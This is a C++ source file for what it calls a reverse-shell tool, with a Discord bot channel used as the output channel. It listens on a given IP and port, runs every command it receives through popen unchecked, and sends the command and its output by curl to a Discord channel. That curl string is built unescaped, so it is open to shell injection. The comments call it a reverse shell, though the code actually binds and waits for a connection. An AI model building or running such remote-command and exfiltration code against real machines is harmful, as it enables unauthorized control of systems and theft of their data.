//g++ -o Discord.o Discord.cpp -lpthread

#include <iostream>
#include <cstring>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h> // Include this header for inet_addr
#include <unistd.h>
#include <cstdlib>
#include <thread>
#include <future>
#include <chrono>
#include <nlohmann/json.hpp> // Ensure you have this library available

using json = nlohmann::json;

const std::string DISCORD_API_URL = "https://discord.com/api/v10";

// Function to execute a shell command
std::string exec(const char* cmd) {
    char buffer[128];
    std::string result = "";
    std::shared_ptr<FILE> pipe(popen(cmd, "r"), pclose);
    if (!pipe) {
        throw std::runtime_error("popen() failed!");
    }
    while (fgets(buffer, sizeof buffer, pipe.get()) != nullptr) {
        result += buffer;
    }
    return result;
}

// Function to send a message to a Discord channel
void sendDiscordMessage(const std::string& token, const std::string& channelId, const std::string& message) {
    json payload;
    payload["content"] = message;

    std::string command = "curl -X POST " + DISCORD_API_URL + "/channels/" + channelId + "/messages"
                        + " -H \"Authorization: Bot " + token + "\""
                        + " -H \"Content-Type: application/json\""
                        + " -d '" + payload.dump() + "'";
    
    exec(command.c_str());
}

// Function to handle incoming commands from the reverse shell
void handleClient(int client_socket, const std::string& token, const std::string& channelId) {
    char buffer[1024];
    while (true) {
        memset(buffer, 0, sizeof(buffer));
        int bytes_read = read(client_socket, buffer, sizeof(buffer) - 1);
        if (bytes_read <= 0) {
            std::cerr << "Client disconnected." << std::endl;
            break;
        }

        // Execute command and send output back to Discord
        std::string command(buffer);
        std::string output = exec(command.c_str());
        sendDiscordMessage(token, channelId, "Command executed: " + command + "\nOutput:\n" + output);
    }
}

// Function to establish reverse shell connection
int establishReverseShell(const std::string& ip, int port, const std::string& token, const std::string& channelId) {
    int server_fd;
    struct sockaddr_in address;
    int opt = 1;
    int addrlen = sizeof(address);
    
    // Create socket file descriptor
    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
        std::cerr << "Socket creation error" << std::endl;
        return -1;
    }

    // Forcefully attaching socket to the port
    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt))) {
        std::cerr << "setsockopt error" << std::endl;
        return -1;
    }

    address.sin_family = AF_INET;
    address.sin_addr.s_addr = inet_addr(ip.c_str());
    address.sin_port = htons(port);

    // Bind the socket to the port
    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0) {
        std::cerr << "Bind failed" << std::endl;
        return -1;
    }

    // Start listening
    if (listen(server_fd, 3) < 0) {
        std::cerr << "Listen failed" << std::endl;
        return -1;
    }

    std::cout << "[*] Waiting for incoming connection on " << ip << ":" << port << "..." << std::endl;
    
    // Accept incoming connections
    int new_socket = accept(server_fd, (struct sockaddr *)&address, (socklen_t*)&addrlen);
    if (new_socket < 0) {
        std::cerr << "Accept failed" << std::endl;
        return -1;
    }

    std::cout << "[*] Client connected." << std::endl;

    // Handle incoming commands
    handleClient(new_socket, token, channelId);

    close(new_socket);
    close(server_fd);
    return 0;
}

// ASCII Banner
void printBanner() {
    std::cout << "\033[95m"
              << R"(
             ⣼⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦
           ⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶
          ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿
          ⣿⣿⣿⣿⣿⣿⣿⣿⠛⠩⡐⢄⠢⠙⢋⠍⣉⠛⡙⡀⢆⡈⠍⠛⣿⣿⣿⣿⣿⣿⣿⣿
          ⣿⣿⣿⣿⣿⣿⣿⠃⠌⡡⠐⢂⠡⠉⡄⠊⢄⢂⠡⠐⠂⢌⠘⡰⠘⣿⣿⣿⣿⣿⣿⣿
          ⣿⣿⣿⣿⣿⣿⠃⠌⠒⢠⠑⡨⠄⠃⠤⠉⢄⠢⠌⢡⠉⢄⢂⠡⠒⠸⣿⣿⣿⣿⣿⣿
          ⣿⣿⣿⣿⣿⡏⠤⢉⠰⢁⢢⣶⣾⣧⢂⠩⡀⠆⣼⣶⣮⣄⠂⡂⠍⣂⢹⣿⣿⣿⣿⣿
          ⣿⣿⣿⣿⣿⠁⢆⠨⢐⠂⣿⣿⣿⣿⠇⢂⠱⢸⣿⣿⣿⡿⢀⠂⠅⢢⠘⣿⣿⣿⣿⣿
          ⣿⣿⣿⣿⣿⠌⢠⠂⢡⠊⠌⠛⠟⡋⢌⠂⢅⢂⡙⠿⠛⣁⢂⠉⡄⠃⡌⣿⣿⣿⣿⣿
          ⣿⣿⣿⣿⣿⡨⠄⡘⠄⠎⣔⣉⡐⠌⡐⣈⠂⠆⡐⢂⣡⣤⢂⠡⡐⢡⢐⣿⣿⣿⣿⣿
          ⣿⣿⣿⣿⣿⣿⣶⣥⣘⡐⠨⣽⣿⣿⣷⣶⣾⣾⣿⣿⣯⢁⠢⣐⣤⣷⣿⣿⣿⣿⣿⣿
          ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
           ⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿
             ⠛⠿⢿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⢿⠿⠟⠋
)" << std::endl;
    std::cout << "\033[0m"; // Reset color
}

// Main function to run the entire script
int main() {
    printBanner(); // Print the ASCII banner

    std::cout << "Enter your Discord bot token: ";
    std::string token;
    std::getline(std::cin, token);

    std::cout << "Enter your Discord channel ID: ";
    std::string channelId;
    std::getline(std::cin, channelId);

    std::string ip;
    std::cout << "Enter the IP for the reverse shell: ";
    std::getline(std::cin, ip);

    int port;
    std::cout << "Enter the port number for the reverse shell: ";
    std::cin >> port;

    std::thread serverThread(establishReverseShell, ip, port, token, channelId);
    serverThread.join();

    return 0;
}

